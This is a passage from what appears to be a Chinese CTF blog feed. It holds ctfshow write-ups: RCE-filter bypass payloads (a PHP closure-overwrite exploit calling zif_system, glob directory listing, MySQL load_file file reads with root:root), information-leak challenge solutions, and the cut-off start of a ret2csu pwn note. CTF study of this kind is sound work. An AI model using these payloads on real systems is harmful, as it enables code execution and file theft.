class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x110</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%2<span class="title">b</span>%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">fake_obj_offset</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">c</span>+<span class="title">leak</span>(%24<span class="title">closure_obj</span>%2<span class="title">c</span>+%24<span class="title">i</span>))%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">pwn</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+%24<span class="title">fake_obj_offset</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x38</span>%2<span class="title">c</span>+1%2<span class="title">c</span>+4)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">type</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">zif_system</span>)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">handler</span>%0<span class="title">a</span>%0<span class="title">a</span>++++(%24<span class="title">helper</span>-%3<span class="title">eb</span>)(%24<span class="title">cmd</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">exit</span>()%3<span class="title">b</span>%0<span class="title">a</span>%7<span class="title">d</span></span></span><br></pre></td></tr></table></figure><h1 id="web73"><a class="markdownIt-Anchor" href="#web73">#</a> Web73：</h1><p>​又是，没源码，那就 glob 遍历文件目录吧，当然 var_export 也可以做到这里没有被 ban：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>​突然发现 include 读取文件又可以了，直接读：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">indlude</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web74"><a class="markdownIt-Anchor" href="#web74">#</a> Web74：</h1><p>​这一题 ban 了 scandir，那就直接 glob 绕过：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>​之后 include 去读。</p><h1 id="web75"><a class="markdownIt-Anchor" href="#web75">#</a> Web75：</h1><p>​glob 读根目录结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>​多次测试，发现无法读取文件，可以试着利用 mysql 去读取文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>​简单解释一下这个 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 使用PDO（PHP Data Objects）创建一个新的数据库连接对象，指定DSN、用户名（root）和密码（root）</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行一个SQL查询，从指定的文件（/flag36.txt）中读取内容</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">        <span class="comment">// 输出读取到的内容，并追加一个竖线（|）</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将数据库连接对象设置为null，关闭连接</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果发生PDO异常，输出错误信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="comment">// 终止脚本执行</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web76"><a class="markdownIt-Anchor" href="#web76">#</a> Web76：</h1><p>​还是 glob 读文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>​还是老样子，MySQL 读文件一把梭：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="一些总结文章"><a class="markdownIt-Anchor" href="#一些总结文章">#</a> 一些总结文章：</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzE1OTU3L2FydGljbGUvZGV0YWlscy8xMTg4NTU4NjU/b3BzX3JlcXVlc3RfbWlzYz0mYW1wO3JlcXVlc3RfaWQ9JmFtcDtiaXpfaWQ9MTAyJmFtcDt1dG1fdGVybT1saW51eCVFNSU4RiU5NiVFNSU4RiU4RCVFNSU5MSVCRCVFNCVCQiVBNHJjZSVFOCU4NCU5QSVFNiU5QyVBQyZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtMTE4ODU1ODY1LjE0MiU1RXYxMDAlNUVwY19zZWFyY2hfcmVzdWx0X2Jhc2U2JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">总结 rce（远程代码执行各种 sao 姿势）绕过 bypass</span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web29&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web29&quot;&gt;#&lt;/a&gt; Web29：&lt;/h1&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-信息搜集</title>
    <link href="http://blog.g01den.top/posts/97a7dff3.html"/>
    <id>http://blog.g01den.top/posts/97a7dff3.html</id>
    <published>2024-09-14T08:55:17.000Z</published>
    <updated>2024-09-14T09:06:10.494Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web1"><a class="markdownIt-Anchor" href="#web1">#</a> Web1：</h1><p>​题目描述：开发注释未及时删除 。</p><p>​打开题目后提示 web1:where is flag?</p><p>​ctrl+u 读取源码。</p><h1 id="web2"><a class="markdownIt-Anchor" href="#web2">#</a> Web2：</h1><p>​题目描述：js 前台拦截 === 无效操作</p><p>​打开题目后显示：无法查看源代码</p><p>​右键无法用，但是 ctrl+u 可以用。</p><h1 id="web3"><a class="markdownIt-Anchor" href="#web3">#</a> Web3：</h1><p>​提示要抓包，那就抓包，发送到 repeater，响应头里发现 flag。</p><h1 id="web4"><a class="markdownIt-Anchor" href="#web4">#</a> Web4：</h1><p>​题目描述：总有人把后台地址写入 robots，帮黑阔大佬们引路。</p><p>​基础知识：Robots 协议（也称<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclODglQUMlRTglOTklQUImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">爬虫</span>协议，机器人协议等）的全称是 “网络爬虫排除协议”，网站通过 Robots 协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</p><blockquote><p>Robots 参数：</p><p>User-agent：</p><p>作用：用于描述搜索引擎蜘蛛的名字；</p><p>技巧：</p><p>1，当 robots.txt 不为空的时候，必须至少有一条 user-agent 的记录；</p><p>2，相同名字，只能有一条，但是不同的蜘蛛，可以有多条记录；</p><p>Disallow：</p><p>作用：用于描述不允许搜索引擎蜘蛛爬行和抓取的 url；</p><p>使用技巧：</p><p>在 robots.txt 中至少要有一条 disallow；<br>Disallow 记录为空，则表示网站所有页面都允许被抓取；<br>使用 disallow，每个页面必须单独分开声明；<br>注意 disallow：/abc/ 和 disallow：/abc 的区别；</p><p>Allow：</p><p>作用：用于描述搜索引擎蜘蛛爬行和抓取的 url；</p><p>使用技巧：搜索引擎默认所有的 url 是 Allow；</p></blockquote><p>​访问 robots.txt 文件发现如下：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flagishere.txt</span><br></pre></td></tr></table></figure><p>​访问这个文件后得到 flag。</p><h1 id="web5"><a class="markdownIt-Anchor" href="#web5">#</a> Web5：</h1><p>​题目描述：phps 源码泄露有时候能帮上忙</p><p>​前置知识：<strong>phps 文件</strong>就是 php 的源代码文件，通常用于提供给用户（访问者）直接通过 Web 浏览器查看 php 代码的内容。</p><p>​访问 index.phps 文件下载后打开即可得到 flag。</p><h1 id="web6"><a class="markdownIt-Anchor" href="#web6">#</a> Web6：</h1><p>​题目描述：解压源码到当前目录，测试正常，收工</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  常见的网站源码备份文件后缀：</span><br><span class="line"></span><br><span class="line">tar</span><br><span class="line">tar.gz</span><br><span class="line">zip</span><br><span class="line">rar</span><br><span class="line">  常见的网站源码备份文件名：</span><br><span class="line">web</span><br><span class="line">website</span><br><span class="line">backup</span><br><span class="line">back</span><br><span class="line">www</span><br><span class="line">wwwroot</span><br><span class="line">temp</span><br></pre></td></tr></table></figure><p>​访问 www.zip 获得源码，里面有 flag。</p><h1 id="web7"><a class="markdownIt-Anchor" href="#web7">#</a> Web7：</h1><p>​题目描述：版本控制很重要，但不要部署到生产环境更重要。</p><p>​git 泄露，直接访问 /.git/ 即可，或者 Githack 一把梭。</p><h1 id="web8"><a class="markdownIt-Anchor" href="#web8">#</a> Web8：</h1><p>​题目描述：版本控制很重要，但不要部署到生产环境更重要。</p><p>​.svn 泄露，直接访问。</p><h1 id="web9"><a class="markdownIt-Anchor" href="#web9">#</a> Web9：</h1><p>​题目描述：发现网页有个错别字？赶紧在生产环境 vim 改下，不好，死机了</p><pre><code>vim泄露：当vim异常退出时，都会生成一个用于备份缓冲区内容的swp临时文件，来记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。假如原文件名为index.php第一次产生的交换文件名为.index.php.swp第二次产生的交换文件名为.index.php.swo第三次产生的交换文件名为.index.php.swn</code></pre><p>​访问这个文件 <code>index.php.swp</code> ，然后记事本打开拿到 flag。</p><h1 id="web10"><a class="markdownIt-Anchor" href="#web10">#</a> Web10：</h1><p>​题目描述：cookie 只是一块饼干，不能存放任何隐私数据。</p><p>​抓包，在 cookie 处发现 flag。</p><h1 id="web11"><a class="markdownIt-Anchor" href="#web11">#</a> Web11：</h1><p>​题目描述：域名其实也可以隐藏信息，<span class="exturl" data-url="aHR0cDovL3huLS1mbGFnLWY5NmczMTVnLmN0ZnNob3cuY29t">比如 flag.ctfshow.com</span> 就隐藏了一条信息</p><p>​<span class="exturl" data-url="aHR0cHM6Ly9ib2NlLmFsaXl1bi5jb20vaG9tZSVFOSU4NyU4QyVFOSU5RCVBMiVFNiU5RiVBNSVFNCVCRiVBMSVFNiU4MSVBRiVFRiVCQyU4QyVFNCVCRCU4NiVFNiU5OCVBRiVFNiU4OCU5MSVFNCVCOCU4RCVFNyU5RiVBNSVFOSU4MSU5MyVFNCVCOCVCQSVFNSU5NSVBNSVFNiU5RiVBNSVFNCVCOCU4RCVFNSU4OCVCMCVFRiVCQyU4QyVFNCVCOCU4RCVFNyVBRSVBMSVFNCVCQSU4NiVFMyU4MCU4Mg==">https://boce.aliyun.com/home 里面查信息，但是我不知道为啥查不到，不管了。</span></p><h1 id="web12"><a class="markdownIt-Anchor" href="#web12">#</a> Web12：</h1><p>​题目描述：有时候网站上的公开信息，就是管理员常用密码</p><p>​访问 robots.txt 获取一些信息，就是 /admin/ 目录，访问后弹出来了个登陆框，密码一般是 admin，密码在 index 页面最下面：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Help Line Number : 372619038</span><br></pre></td></tr></table></figure><h1 id="web13"><a class="markdownIt-Anchor" href="#web13">#</a> Web13：</h1><p>​题目描述：技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p><p>​读源码，发现 document.pdf 文件，打开发现了账号密码和一个页面，进入这个文件后登陆发现 flag。</p><h1 id="web14"><a class="markdownIt-Anchor" href="#web14">#</a> Web14：</h1><p>​题目描述：有时候源码里面就能不经意间泄露重要 (editor) 的信息，默认配置害死人</p><p>​直接访问 /editor/ 目录，点插入文件，找到 flag 文件的大致文件结构，相对路径访问即可得到 flag。</p><h1 id="web15"><a class="markdownIt-Anchor" href="#web15">#</a> Web15：</h1><p>​题目描述；公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p><p>​社工题，对真正技术没啥太大的关系。</p><p>​直接拉到最下边，电话号码和邮箱都有，url 直接访问 admin，进入登陆后台，之后就是忘记密码，提示：我的所在地是哪个城市？根据 qq 邮箱的 qq 号发现属地，通过这个修改密码即可。</p><h1 id="web16"><a class="markdownIt-Anchor" href="#web16">#</a> Web16：</h1><p>​题目描述：对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p><p>​有大佬用 Wappalyzer 检测到了 PHP，但是访问 tz.php 的原因是啥不是很清楚。打开 tz.php 之后找到 PHP 相关参数，打开 PHPIINFO 然后搜索 ctfshow 即可发现 flag。</p><h1 id="web17"><a class="markdownIt-Anchor" href="#web17">#</a> Web17：</h1><p>​题目描述：备份的 sql 文件会泄露敏感信息</p><p>​sql 文件的备份一般为 backup.sql，所以访问下载这个文件，记事本打开之后找到了如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `ctfshow_secret` <span class="keyword">VALUES</span> (<span class="string">&#x27;ctfshow&#123;40b3ed5b-2454-49c7-a6ad-77e5cc738e2f&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><h1 id="web18"><a class="markdownIt-Anchor" href="#web18">#</a> Web18：</h1><p>​题目描述：不要着急，休息，休息一会儿，玩 101 分给你 flag</p><p>​读 js 源码，找到以下逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​unicode 解码是：你赢了，去幺幺零点皮爱吃皮看看，提示读取 110.php，读取后获得 flag。</p><h1 id="web19"><a class="markdownIt-Anchor" href="#web19">#</a> Web19：</h1><p>​题目描述：密钥什么的，就不要放在前端了</p><p>​读源码，找到了被注释的 php 代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    &lt;!--</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    --&gt;</span><br></pre></td></tr></table></figure><p>​账号密码都有了，后端抓包改包发送即可获得 flag。</p><h1 id="web20"><a class="markdownIt-Anchor" href="#web20">#</a> Web20：</h1><p>​题目描述：mdb 文件是早期 asp+access 构架的数据库文件，文件泄露相当于数据库被脱裤了。</p><p>​扫后台发现了 db 文件，下载即可，之后用数据库管理工具打开即可得到 flag。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web1&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web1&quot;&gt;#&lt;/a&gt; Web1：&lt;/h1&gt;
&lt;p&gt;​		题目描述：开发注释未及时删除 。&lt;/p&gt;
&lt;p&gt;​		打开题目后提示 web1:where is flag?&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>pwn学习笔记（9）-中级ROP--ret2csu</title>
    <link href="http://blog.g01den.top/posts/c8624158.html"/>
    <id>http://blog.g01den.top/posts/c8624158.html</id>
    <published>2024-08-08T18:55:43.000Z</published>
    <updated>2024-08-18T16:45:41.372Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn学习笔记9-中级ropret2csu"><a class="markdownIt-Anchor" href="#pwn学习笔记9-中级ropret2csu">#</a> pwn 学习笔记（9）- 中级 ROP–ret2csu</h1><h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h2><p>​首先是 64 位文件的传参方式：前六个参数是从左到右放入寄存器：rdi、rsi、rdx、rcx、r8、r9，之后的通过栈传参。</p><p>​比如：</p><blockquote><p>传参函数大于 7 个：</p><p>H(a,b,c,d,e,f,g,h)</p><p>a-&gt;%rdi、b-&gt;%rsi、c-&gt;%rdx、d-&gt;%rcx、e-&gt;%r8、f-&gt;%r9</p><p>h-&gt;(%esp)</p><p>g-&gt;(%esp)</p><p>call H</p></blockquote><p>​先看看如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">int</span> a = <span class="number">1</span>,b = <span class="number">2</span>,c = <span class="number">3</span>,d = <span class="number">4</span>,e = <span class="number">5</span>,f = <span class="number">6</span>,g = <span class="number">7</span>,h = <span class="number">8</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,H(a,b,c,d,e,f,g,h));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">H</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b,<span class="type">int</span> c,<span class="type">int</span> d,<span class="type">int</span> e,<span class="type">int</span> f,<span class="type">int</span> g,<span class="type">int</span> h)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b+c+d+e+f+g+h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​之后反汇编一下 main 函数和 H 函数的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0000000000001149 &lt;main&gt;:</span><br><span class="line">    1149:       f3 0f 1e fa             endbr64</span><br><span class="line">    114d:       55                      push   rbp</span><br><span class="line">    114e:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    1151:       48 83 ec 20             sub    rsp,0x20</span><br><span class="line">    1155:       c7 45 e0 01 00 00 00    mov    DWORD PTR [rbp-0x20],0x1</span><br><span class="line">    115c:       c7 45 e4 02 00 00 00    